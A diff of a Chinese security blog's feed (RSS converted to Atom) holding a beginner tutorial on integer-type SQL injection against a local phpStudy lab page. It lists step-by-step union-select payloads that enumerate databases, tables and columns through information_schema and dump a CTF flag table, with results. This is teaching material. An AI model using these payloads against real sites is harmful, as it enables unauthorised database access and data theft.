@@ -1,24 +1,19 @@
 <?xml version="1.0"?>
-<rss version="2.0">
-    <channel>
-        <title>My Violet Eva Garden • Posts by &#34;sql注入&#34; category</title>
-        <link>https://kiyomijin.github.io</link>
-        <description></description>
-        <language>zh-CN</language>
-        <pubDate>Thu, 29 Sep 2022 00:27:56 +0800</pubDate>
-        <lastBuildDate>Thu, 29 Sep 2022 00:27:56 +0800</lastBuildDate>
-        <category>原创</category>
-        <category>SQL注入</category>
-        <category>CTF小训</category>
-        <category>Misc</category>
-        <category>数据库安全</category>
-        <item>
-            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid>
-            <title>整型注入</title>
-            <link>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</link>
-            <category>SQL注入</category>
-            <pubDate>Thu, 29 Sep 2022 00:27:56 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;sql注入之整型注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入之整型注入&#34;&gt;#&lt;/a&gt; SQL 注入之整型注入&lt;/h1&gt;
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://kiyomijin.github.io</id>
+    <title>My Violet Eva Garden • Posts by &#34;sql注入探究&#34; tag</title>
+    <link href="https://kiyomijin.github.io" />
+    <updated>2022-09-28T16:27:56.000Z</updated>
+    <category term="原创" />
+    <category term="数据库安全" />
+    <category term="SQL注入探究" />
+    <category term="CTF小训" />
+    <category term="Misc" />
+    <entry>
+        <id>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</id>
+        <title>整型注入</title>
+        <link rel="alternate" href="https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/"/>
+        <content type="html">&lt;h1 id=&#34;sql注入之整型注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入之整型注入&#34;&gt;#&lt;/a&gt; SQL 注入之整型注入&lt;/h1&gt;
 &lt;p&gt;本篇使用整型注入来从 0 到 1 进入 “SQL 注入” 的大门。&lt;/p&gt;
 &lt;h2 id=&#34;环境准备&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境准备&#34;&gt;#&lt;/a&gt; 环境准备&lt;/h2&gt;
 &lt;p&gt;当然是先安装 phpStudy，然后一键傻瓜式安装后点击启动按钮&lt;/p&gt;
@@ -149,7 +144,8 @@
 &lt;p&gt;小练习&lt;/p&gt;
 &lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt;查看注入类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-1.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-1.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; # 报错(整型和单引号都会报错)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#2.确定整型注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=1 # (只有整型不会报错)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: Kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#3.确定列数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=1 union select 1, 2, 3 #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: Kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#4.构造联合查询,确定所在库名。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), schema_name from information_schema.schemata #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: information_schema&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#5.确定在这个库中，都有什么表&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(table_name) from information_schema.tables where table_schema = database()#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: emails,flag,users&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#6.确定我们要找flag表，并看这个表中有什么列&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &amp;#x27;&lt;/span&gt;flag&lt;span class=&#34;string&#34;&gt;&amp;#x27;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: flag,value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#7.取列的值，另外把查询的from 后面改成对应的&amp;quot;库.表&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=2356 union select 1,database(), group_concat(concat_ws(&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;#x27;, flag, value)) from challenge.flag#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:any,flag8:sqlc,flag9:tasi,flag10:moo,flag12:false,flag11:muse&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;至此，整型注入演示完毕。&lt;/p&gt;
- ]]></description>
-        </item>
-    </channel>
-</rss>
+</content>
+        <category term="SQL注入探究" />
+        <updated>2022-09-28T16:27:56.000Z</updated>
+    </entry>
+</feed>
